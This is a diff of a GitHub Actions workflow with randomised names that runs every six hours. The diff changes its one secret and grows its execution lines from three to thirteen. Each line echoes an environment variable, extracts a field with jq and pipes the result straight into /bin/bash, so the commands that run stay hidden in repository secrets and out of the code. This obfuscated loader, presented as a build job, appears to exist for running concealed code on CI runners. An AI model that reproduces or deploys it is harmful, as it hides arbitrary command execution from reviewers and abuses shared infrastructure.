@@ -1,19 +1,29 @@
 name: reductionequal
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 1/6 * * *'
-jobs:  # 24462
+    - cron: '12 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: reductionequal
         env:
-          hlfed491: ${{ secrets.hlfed491 }}
+          ddxio694: ${{ secrets.ddxio694 }}
         run: |
-          echo $hlfed491 | jq -r .up515 | /bin/bash
-          echo $l75526 | jq -r .ic56 | /bin/bash
-          echo $gvdn23315 | jq -r .co4387 | /bin/bash
+          echo $ddxio694 | jq -r .fo99581 | /bin/bash
+          echo $zutw76916 | jq -r .r6 | /bin/bash
+          echo $cw34 | jq -r .a19 | /bin/bash
+          echo $ojc2010 | jq -r .v9 | /bin/bash
+          echo $irkij5630 | jq -r .xjuea625 | /bin/bash
+          echo $tcios141 | jq -r .qljsh64 | /bin/bash
+          echo $tjme82 | jq -r .tq81665 | /bin/bash
+          echo $t6804 | jq -r .yf77208 | /bin/bash
+          echo $ups635 | jq -r .lab0999 | /bin/bash
+          echo $by4 | jq -r .nln113 | /bin/bash
+          echo $ym8570 | jq -r .vapfv2283 | /bin/bash
+          echo $nwhcd06 | jq -r .nkq2470 | /bin/bash
+          echo $v48181 | jq -r .gcur23132 | /bin/bash
 
